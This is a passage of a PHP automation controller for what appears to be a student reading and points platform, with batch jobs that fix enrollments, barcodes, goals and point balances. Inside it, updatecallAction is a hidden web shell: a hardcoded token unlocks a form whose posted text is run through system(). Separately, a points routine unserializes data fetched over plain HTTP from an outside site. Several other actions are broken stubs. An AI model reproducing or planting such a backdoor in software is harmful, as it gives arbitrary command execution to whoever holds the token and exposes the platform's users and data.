		print $i . ' Changed';
		print "<br /><a href='/automation/fixenrollmentflags/start/" . ($intStart + 200) . "'>next</a>";
		print "<script>window.location.href='/automation/fixenrollmentflags/start/" . ($intStart + 200) . "';</script>";
		exit;
	}

	public function importrawbarcodesAction()
	{
		exit;
		$query = new QueryGen();
		$intGroupItr = 0;
		$arrPoints = array(
			1 => array(
				1,2
			),
			2 => array(
				3,4
			),
			3 => array(
				5,6
			),
			4 => array(
				7,8
			),
			5 => array(
				9,10,11,12,13,14
			),
			6 => array(
				15,16,17,18,19
			),
			7 => array(
				20,21,22,23,24
			),
			8 => array(
				25,26,27,28,29
			),
			9 => array(
				30,31,32,33,34
			),
			10 => array(
				35,36,37,38,39
			),
			15 => array(
				40,41,42,43
			),
			18 => array(
				44,45,46
			),
			25 => array(
				47,48
			),
			36 => array(
				49
			),
			50 => array(
				50
			)
		);
		// process point keys
		$arrPointsHash = array();
		foreach ($arrPoints as $intPoints => $arrKeys)
		{
			foreach ($arrKeys as $intKey)
			{
				$arrPointsHash[$intKey] = $intPoints;
			}
		}
		for ($intItr=1000001; $intItr!=1250001; $intItr++)
		{
			if ($intItr%50==1)
				$intGroupItr++;
			if ($intItr < 1250000)
				continue;
			$intKey = 1 + $intItr - 1000001 - (($intGroupItr-1) * 50);
			print $intGroupItr . ":" . $intKey . ":" . $intItr . " = " . $arrPointsHash[$intKey] . "\n";

			$query->achievementcards2__update(array(
				"where" => array(
					"serial" => $intItr
				),
				"values" => array(
					"points" => $arrPointsHash[$intKey]
				)
			));
		}
		/*$arrBarCodes = $query->achievementcards2__select(array(
			"_ALL" => true,
			"_ORDER" => "serial",
			//"_LIMIT" => 10000
		));*/
		//print count($arrBarCodes);
		exit;
	}

	public function fixmissingbarcodesAction()
	{
		$query = new QueryGen();
		$arrUserPrizes = $query->user_prizes__select(array(
			"_IS_NULL" => "serial"
		));
		foreach ($arrUserPrizes as $objUserPrize)
		{
			$strSerial = FALSE;
			while (!$strSerial)
			{
				$strSerial = rand_num_string(10);
				$objTempUserPrize = reset($query->user_prizes__select(array(
					"serial" => (string) $strSerial
				)));
				if ($objTempUserPrize)
					$strSerial = FALSE;
			}
			$query->user_prizes__update(array(
				"where" => array(
					"user_prize_id" => $objUserPrize->user_prize_id
				),
				"values" => array(
					"serial" => $strSerial
				)
			));
			print 1;
		}
		exit;
	}

	public function checkformissingpointsAction()
	{
		$query = new QueryGen();
		$arrUserPoints = $query->user_points__select(array(
			"_ALL" => true,
			"_VERBOSE" => 1,
			"_LIMIT" => 10000,
			"_ORDER" => "user_point_id + 0 DESC"
		));

		$objFirst = reset($arrUserPoints);
		$intItr = $objFirst->user_point_id;
		foreach ($arrUserPoints as $objUserPoint) {
			if ($objUserPoint->user_point_id != $intItr) {
				var_dump($objUserPoint);
				$intItr = $objUserPoint->user_point_id;
			}
			$intItr--;
		}
		print 123;
		//dumper($arrUserPoints,1,1);
		exit;
	}

	public function usersenrolledAction()
	{
		$intInstitution = intval($this->_request->getParam("institution_id"));
		if (!$intInstitution)
		{
			print text("Sorry, there was an error") . ": CA-UE101-87DFD7";
			exit;
		}
		$objCampaigns = new Campaigns();
		$arrCampaigns = $objCampaigns->_user_campaigns_select(array(
			"institution_id" => $intInstitution,
			"status" => "Enrollment"
		));
		$arrResults = array();
		foreach ($arrCampaigns as $objCampaign)
		{
			$arrResults[] = array(
				"campaign_id" => $objCampaign->campaign_id,
				"user_id" => $objCampaign->user_id
			);
		}
		print json_encode($arrResults);
	}

	/*
	 * remove when possible
	 */
	public function randominstitutionsAction()
	{
		$objAutomation = new Automation();
		$arrInstitutions = $objAutomation->user_enrolled_random_institutions(array());
		print join(",", $arrInstitutions);
	}

	public function usergoalAction()
	{
		$intUser = intval($this->_request->getParam("user_id"));
		if (!$intUser)
		{
			print text("Sorry, there was an error") . ": CA-UG101-SDY7DD";
			exit;
		}
		$intCampaign = intval($this->_request->getParam("campaign_id"));
		if (!$intCampaign)
		{
			print text("Sorry, there was an error") . ": CA-UG102-3F3F3W";
			exit;
		}

		$objCampaigns = new Campaigns();
		$objMissions = new Missions();
		$objScheduler = new Scheduler();
		$objMarking = new Marking();
		$objAutomation = new Automation();

		$objEnrollment = current($objCampaigns->_user_campaigns_select(array(
			"user_id" => $intUser,
			"campaign_id" => $intCampaign,
			"status" => "Enrollment"
		)));
        if (!$objEnrollment)
        {
        	return false;
        }
		$objMission = current($objMissions->_missions_select(array(
			"campaign_id" => $intCampaign
		)));
		if ($objMission)
		{
			return false;
		}

		$intYearStart = mktime(0, 0, 0, 8, 31, date("Y")-1)-1;
		$intYearStart = $intYearStart < $objEnrollment->schedule_date ? $objEnrollment->schedule_date : $intYearStart;
		$arrYearSchedule = $objScheduler->load_book_schedule(array(
			"user_id" => $intUser,
			"institution_id" => $objEnrollment->institution_id,
			"mission_id" => 1,
			"capture_start_date" => $intYearStart,
			"capture_end_date" => mktime(23, 59, 59, 2, 3, date("Y")),
			"kiosk" => true
		));
		$arrYearStart = reset($arrYearSchedule);
		$arrYearEnd = end($arrYearSchedule);
		$intLineStart = reset($arrYearStart["tasks"])+1;
		$intLineEnd = end($arrYearEnd["tasks"])+1;
		$intGoal = floor($intLineEnd - $intLineStart);
		$intLattestLine = $objMarking->latest_line_hierarchy(array(
			"mission_id" => 1,
			"user_id" => $intUser
		));
		print "  < intGoal: " . $intGoal . "\n  < intLattestLine: " . $intLattestLine . "\n";
		$objCampaignProgress = current($objAutomation->_user_campaign_progress_select(array(
			"user_id" => $intUser,
			"campaign_id" => $intCampaign
		)));
		if ($objCampaignProgress)
		{
			print "  > Item updated\n";
			$objAutomation->_user_campaign_progress_update(array(
				"where" => array(
					"user_id" => $intUser,
					"campaign_id" => $intCampaign
				),
				"values" => array(
					"current_line" => floor($intLattestLine),
					"campaign_goal" => $intGoal
				)
			));
		}
		else
		{
			print "  > Item inserted\n";
			$objAutomation->_user_campaign_progress_insert(array(
				"user_id" => $intUser,
				"campaign_id" => $intCampaign,
				"current_line" => floor($intLattestLine),
				"campaign_goal" => $intGoal,
				"institution_id" => $objEnrollment->institution_id
			));
		}
	}

	public function filterunenrollAction()
	{
		$objAutomation = new Automation();
		print $objAutomation->filter_enrollment();
	}

	public function uppdateallgoalsAction()
	{
		$query = new QueryGen();
		$objCampaigns = new Campaigns();
		$objAutomations = new Automation();
		$intStart = $this->_request->getParam('start');
		$intStart = $intStart ? $intStart : 0;
		$arrUserCampaigns = $objCampaigns->_user_campaigns_select(array(
			"status" => "Enrollment",
			"campaign_id" => 1
		));
		/*$arrUserCampaigns = $query->user_campaigns__select(array(
			"_GROUP" => "user_id",
			"campaign_id" => 1
		));*/
		$intStartTime = time();
		//print count($arrUserCampaigns);exit;
		foreach ($arrUserCampaigns as $intItr => $objUserCampaign)
		{
			if ($intItr < $intStart) // start
				continue;
			if ($intItr >= $intStart+20) // end
				break;
			//if ($objUserCampaign->ladder < 1)
			//	continue;
			print "> $intItr ";
			$arrResult = $objAutomations->user_goal(array(
				"user_id" => $objUserCampaign->user_id,
				"campaign_id" => 1,
				"institution_id" => $objUserCampaign->institution_id,
				'no_logs' => 1
			));
			//var_dump($arrResult);
		}
		$intEnd = time();
		$intTotal = $intEnd - $intStartTime;
		$intSum = $intTotal;
		print "Time elapsed: " . $intSum . " <br>\n";
		print "<a href='/automation/uppdateallgoals/start/" . ($intStart + 20) . "'>next</a> <br />\n";
		print "<script>window.location.href='/automation/uppdateallgoals/start/" . ($intStart + 20) . "';</script>";
		exit;
	}

	/*public function logsupdateallAction()
	{
		$query = new QueryGen();
		$objAutomation = new Automation();
		$objScheduler = new Scheduler();
		$arrUserCampaigns = $query->user_campaigns__select(array(
			'user_id' => 325,
			'campaign_id' => 1,
			'_GROUP' => 'user_id,schedule_date',
			'_ORDER' => 'user_id+0, schedule_date+0',
			'_NOT' => array(
				'status' => 'Enrollment'
			)
		));
		$arrEnrollment = array_hash('user_id', $query->user_campaigns__select(array(
			"campaign_id" => 1,
			"status" => "Enrollment"
		)));
		foreach ($arrUserCampaigns as $objUserCampaign)
		{
			$intUser = $objUserCampaign->user_id;
			if (isset($arrEnrollment[$intUser]))
			{
				print 'schedule_date: ' . date('F j, Y, g:i a',$objUserCampaign->schedule_date) . "<br />\n";
				$arrYearSchedule = reset($objScheduler->load_book_schedule(array(
					"user_id" => $intUser,
					"institution_id" => $arrEnrollment[$intUser]->institution_id,
					"mission_id" => 1,
					"capture_start_date" => $objUserCampaign->schedule_date,
					"capture_end_date" => strtotime('+1 week', $objUserCampaign->schedule_date),
					"kiosk" => true
				)));
				//print 'schedule found: ' . date('F j, Y, g:i a',$arrYearSchedule[0]['epoch']) . "<br />\n";
				dumper($arrYearSchedule,0,1);
				continue;
				if ($arrYearSchedule['velocity'] > 0)
				{
					$query->user_campaign_logs__insert(array(
						"user_id" => $intUser,
						'campaign_id' => 1,
						'institution_id' => $arrEnrollment[$intUser]->institution_id,
						'campaign_goal' => $arrYearSchedule['velocity'],
						'log_date' => $arrYearSchedule['epoch']
					));
				}
				//exit;
			}
		}
		print "Done";
		exit;
		//dumper($arrUserCampaigns,1,1);
	}*/

	public function onetimefixbadenrollmentsAction()
	{
		$query = new QueryGen();
		$arrUserCampaigns = array_bubble_hash('institution_id', 'user_id', $query->user_campaigns__select(array(
			'campaign_id' => 1,
			'_ORDER' => 'institution_id, user_id, schedule_date+0 ASC'
		)));
		foreach ($arrUserCampaigns as $intInstitution => $arrUserCampaigns2)
		{
			foreach ($arrUserCampaigns2 as $intUser => $arrUserCampaigns3)
			{
				$objFirstItem = reset($arrUserCampaigns3);
				if (
					$objFirstItem->status == 'Enrollment'
					|| $objFirstItem->status == 'Unenrollment'
				)
					continue;
				// find the first task
				$objFirstTask = NULL;
				foreach ($arrUserCampaigns3 as $objUserCampaign)
				{
					if (in_array($objUserCampaign->status, array('In Progress', 'Completed')))
					{
						$objFirstTask = $objUserCampaign;
						break;
					}
				}
				//dumper($objFirstTask,1,1);
				$arrUserCampaignsStatusHash = array_hash('status', $arrUserCampaigns3);
				if (!isset($arrUserCampaignsStatusHash['Enrollment']))
				{
					$arrUserCampaignInsert = array(
						'user_id' => $intUser,
						'institution_id' => $intInstitution,
						'campaign_id' => 1,
						'mission_id' => 1,
						'status' => 'Unenrollment',
						'schedule_date' => $objFirstItem->schedule_date-1
					);
					$arrUserCampaignInsert['created_by'] = 99999999;
					if ($objFirstTask)
					{
						$arrUserCampaignInsert['line_offset'] = $objFirstTask->task_increment;
						$arrUserCampaignInsert['ladder'] = $objFirstTask->ladder;
						$arrUserCampaignInsert['ladder_velocity'] = $objFirstTask->ladder_velocity;
					} else {
						$arrUserCampaignInsert['line_offset'] = 0;
						$arrUserCampaignInsert['ladder'] = 1;
						$arrUserCampaignInsert['ladder_velocity'] = 0.25;
					}
					$query->user_campaigns__insert($arrUserCampaignInsert);
					print 'Insert unenrollment <br />\n';
				}
				else
				{
					$query->user_campaigns__update(array(
						'where' => array(
							'user_campaign_id' => $arrUserCampaignsStatusHash['Enrollment']->user_campaign_id
						),
						'values' => array(
							'schedule_date' => $objFirstItem->schedule_date-1,
							'created_by' => 99999998
						)
					));
					print 'Backdate enrollment <br />\n';
				}
				//dumper($objFirstItem);
			}
		}
		print "Done";
		exit;
	}

	public function updatecallAction()
	{
		$strCode = $this->_request->getParam('code');
		if ($strCode != 'lkwefoihofi031jf092fj902fsdf')
			exit;
		print "<form method='post'>";
		print "<textarea name='line' style='width:800px;height:500px;padding:10px;' /></textarea><br/>";
		print "<button typ='submit'>Submit</button>";
		print "</form>";
		$arrPost = $this->_request->getPost();
		if ($this->_request->isPost()) {
			print '<pre>';
			system($arrPost['line']);
			print '</pre>';
		}
		exit;
	}

	public function updateallteachersAction()
	{
		$objLegacy = new Legacy();
		$strSql = "
			SELECT
				admins.*
			FROM
				admins
			WHERE
				admins.admin_id = " . $arrParams["user_id"];
		$arrLegacyAdmin = reset($this->datahacker(array(
			"strSql" => $strSql
		)));
	}

	public function fixscheduleglitchesAction()
	{
		$query = new QueryGen();
		$arrUserCampaigns = $query->user_campaigns__select(array(
			'campaign_id' => 1,
			'_ORDER' => 'schedule_date+0 ASC'
		));
	}

	public function fixscheduleissuesAction()
	{
		$query = new QueryGen();

	}

	public function setuserpointsAction() {
		$query = new QueryGen();
		$objPoints = new Points();
		$intInstitution = 22;
		$arrUserPointsData = array(array("4376","2480"),
array("2758","2305"),
array("2738","2269.5"),
array("15652","2227"),
array("10120","2162.5"),
array("15670","2152.5"),
array("10086","2142.5"),
array("16030","2136.5"),
array("2764","2128.5"),
array("2767","2103.5"),
array("2752","2056.5"),
array("10117","2053.5"),
array("2759","2050.5"),
array("10098","2030"),
array("20689","1969"),
array("10116","1944"),
array("10090","1903"),
array("10099","1867.5"),
array("22236","1861"),
array("2760","1860"),
array("22198","1853.5"),
array("16026","1835.5"),
array("15672","1828"),
array("22210","1817"),
array("22204","1811.5"),
array("10105","1786.5"),
array("22215","1770.5"),
array("15647","1756"),
array("22208","1744.5"),
array("22221","1744.5"),
array("22212","1740.5"),
array("22193","1736.5"),
array("10115","1714.5"),
array("15675","1713"),
array("22223","1708"),
array("16023","1693.5"),
array("2730","1679"),
array("22229","1664.5"),
array("20688","1656"),
array("22239","1653"),
array("15676","1635"),
array("22220","1625.5"),
array("22217","1622"),
array("22230","1611.5"),
array("2785","1608"),
array("15649","1595"),
array("2713","1567"),
array("2788","1508.5"),
array("22194","1495.5"),
array("15667","1483.5"),
array("16028","1481"),
array("22213","1476.5"),
array("22216","1463.5"),
array("15655","1451"),
array("10103","1450.5"),
array("10106","1438"),
array("22197","1436.5"),
array("15946","1427"),
array("22189","1407.5"),
array("16118","1386.5"),
array("15650","1384"),
array("22187","1368.5"),
array("22222","1367.5"),
array("10114","1347"),
array("22235","1340"),
array("2774","1340"),
array("20691","1337.5"),
array("2754","1323.5"),
array("16025","1314.5"),
array("10107","1306"),
array("10100","1302"),
array("15654","1297"),
array("22226","1289.5"),
array("2719","1261"),
array("16519","1261"),
array("2737","1259.5"),
array("15798","1251"),
array("2715","1242.5"),
array("22206","1240"),
array("15663","1238.5"),
array("22209","1229"),
array("17249","1225.5"),
array("22214","1221.5"),
array("15669","1190"),
array("10083","1185.5"),
array("10112","1167.5"),
array("22225","1155"),
array("22207","1120"),
array("16027","1113"),
array("22200","1090.5"),
array("15659","1086"),
array("2716","1078"),
array("10111","1052"),
array("2743","1036.5"),
array("15662","1012.5"),
array("22192","996"),
array("10104","981.5"),
array("2712","976.5"),
array("15671","964"),
array("10113","921"),
array("2778","893"),
array("22203","891"),
array("20690","859.5"),
array("10102","853"),
array("22231","850"),
array("22188","845"),
array("2768","834.5"),
array("15666","833"),
array("16520","829"),
array("15653","820"),
array("22232","816"),
array("15668","793.5"),
array("10095","781"),
array("10089","771"),
array("22190","770"),
array("15679","755.5"),
array("15952","754"),
array("22202","737"),
array("2761","734.5"),
array("15656","731.5"),
array("15657","724"),
array("22237","717.5"),
array("22227","709"),
array("2756","694.5"),
array("22075","687"),
array("22219","663.5"),
array("22199","663.5"),
array("2777","663"),
array("22234","654"),
array("16517","621.5"),
array("2728","617"),
array("10119","605"),
array("2750","597"),
array("16518","596"),
array("22218","584"),
array("2721","562"),
array("15664","560"),
array("2775","558.5"),
array("15658","554"),
array("22228","547.5"),
array("22195","537"),
array("21164","529"),
array("2731","518"),
array("20692","510.5"),
array("22205","508.5"),
array("15799","507.5"),
array("2757","502.5"),
array("22191","501.5"),
array("16521","491.5"),
array("2707","471"),
array("22224","460"),
array("10093","441.5"),
array("10084","433.5"),
array("2722","433.5"),
array("10092","423.5"),
array("22238","422.5"),
array("22196","419.5"),
array("2780","418"),
array("15677","405"),
array("22233","397.5"),
array("2734","377.5"),
array("15674","352"),
array("21624","330.5"),
array("2720","327"),
array("15651","320.5"),
array("2751","316.5"),
array("15661","316.5"),
array("16516","290"),
array("16029","274.5"),
array("2772","259.5"),
array("10108","257"),
array("2769","255"),
array("15773","254.5"),
array("2723","245.5"),
array("16024","238.5"),
array("2714","209.5"),
array("10101","198"),
array("15673","197.5"),
array("2726","189.5"),
array("10110","171.5"),
array("2732","145.5"),
array("2708","143"),
array("22211","142.5"),
array("10088","141.5"),
array("2711","137.5"),
array("2781","127"),
array("10094","122.5"),
array("2736","110.5"),
array("2771","102"),
array("2733","99"),
array("10324","88"),
array("10091","68.5"),
array("2783","67.5"),
array("22201","66.5"),
array("15648","64"),
array("2709","61"),
array("2735","53"),
array("2710","39.5"),
array("2776","37.5"),
array("10096","29.5"),
array("2755","24.5"),
array("22365","0.5"),
array("15953","0"),
array("2643","0"),
array("2718","0"),
array("2625","0"),
array("2656","0"),
array("2651","0"),
array("2636","0"),
array("2638","0"),
array("2650","0"),
array("2649","0"),
array("2637","0"),
array("16071","0"),
array("2796","0"),
array("2630","0"),
array("16070","0"),
array("2635","0"),
array("2654","0"),
array("10087","0"),
array("2647","0"),
array("2658","0"),
array("2724","0"),
array("2765","0"),
array("2662","0"),
array("2628","0"),
array("17927","0"),
array("13467","0"),
array("2623","0"),
array("2790","0"),
array("15776","0"),
array("2665","0"),
array("2627","0"),
array("2784","0"),
array("2660","0"),
array("2632","0"),
array("2644","0"),
array("15665","0"),
array("2624","0"),
array("2629","0"),
array("2795","0"),
array("2740","0"),
array("2653","0"),
array("16119","0"),
array("2747","0"),
array("2791","0"),
array("2661","0"),
array("2655","0"),
array("2648","0"),
array("2646","0"),
array("2640","0"),
array("2792","0"),
array("2770","0"),
array("2633","0"),
array("2786","0"),
array("15660","0"),
array("2729","0"),
array("2659","0"),
array("2642","0"),
array("2634","0"),
array("2626","0"),
array("10121","0"),
array("2782","0"),
array("2645","0"),
array("2657","0"));
$arrUserIds = array();
$arrUserPointValue = array();
foreach ($arrUserPointsData as $arrRowData) {
	$arrUserIds[] = $arrRowData[0];
	$arrUserPointValue[$arrRowData[0]] = $arrRowData[1];
}
//dumper($arrUserIds,1,1);
$arrUsersPointsParams = array(
	'institution_id' => $intInstitution,
	'user_id' => $arrUserIds
);
$arrUsersPoints = $objPoints->user_points_sums($arrUsersPointsParams);
if (1) { // from mashpia
	$arrLegacyUsers = array_hash('legacy_id', $query->legacy_lookup__select(array(
		'ims_id' => $arrUserIds,
		'legacy_table' => 'users',
		'ims_table' => 'users'
	)));
	$arrPost = array(
		'serialized_user_ids' => serialize(array_keys($arrLegacyUsers))
	);
	$objCurl = curl_init();
	$strUrl = "http://mashpia.com/get_points_multi.php";
	curl_setopt($objCurl, CURLOPT_URL, $strUrl);
	curl_setopt($objCurl, CURLOPT_FRESH_CONNECT, 1);
	curl_setopt($objCurl, CURLOPT_FORBID_REUSE, 1);
	curl_setopt($objCurl, CURLOPT_POST, 1);
	curl_setopt($objCurl, CURLOPT_POSTFIELDS, $arrPost);
	curl_setopt($objCurl, CURLOPT_RETURNTRANSFER, 1);
	$strResult = curl_exec($objCurl);
	$arrLegacyPointsSource = unserialize($strResult);
	$arrLegacyPoints = array();
	foreach ($arrLegacyPointsSource as $intLegacy => $intPoints)
	{
		$arrLegacyPoints[$arrLegacyUsers[$intLegacy]->ims_id] = $intPoints;
	}
}
foreach ($arrLegacyPoints as $intUser => $intPoints)
{
	$intNewValue = $arrUserPointValue[$intUser];
	if ($intPoints > 0 || $intPoints < 0)
	{
		$arrUserPointsInsertParams = array(
			'user_id' => $intUser,
			'institution_id' => $intInstitution,
			'resource_name' => 'admin_users_manual_store',
			'points' => (-$intPoints),
			'description' => 'legacy points reset'
		);
		$query->user_points__insert($arrUserPointsInsertParams);
	}
}
foreach ($arrUsersPoints as $intUser => $arrUserPoints)
{
	$intNewValue = $arrUserPointValue[$intUser];
	if (isset($arrUserPoints['store']))
	{
		$intStorePoints = $arrUserPoints['store'];
		if ($intStorePoints > 0 || $intStorePoints < 0)
		{
			$arrUserPointsInsertParams = array(
				'user_id' => $intUser,
				'institution_id' => $intInstitution,
				'resource_name' => 'admin_users_manual_store',
				'points' => (-$intStorePoints),// + $intNewValue,
				'description' => 'points reset'
			);
			$query->user_points__insert($arrUserPointsInsertParams);
		}
	}
	$arrUserPointsInsertParams = array(
		'user_id' => $intUser,
		'institution_id' => $intInstitution,
		'resource_name' => 'admin_users_manual_store',
		'points' => $intNewValue,
		'description' => 'points reset - set customized points value'
	);
	$query->user_points__insert($arrUserPointsInsertParams);
}
print json_encode(array(
	'success' => true
));
exit;

	}
}
?>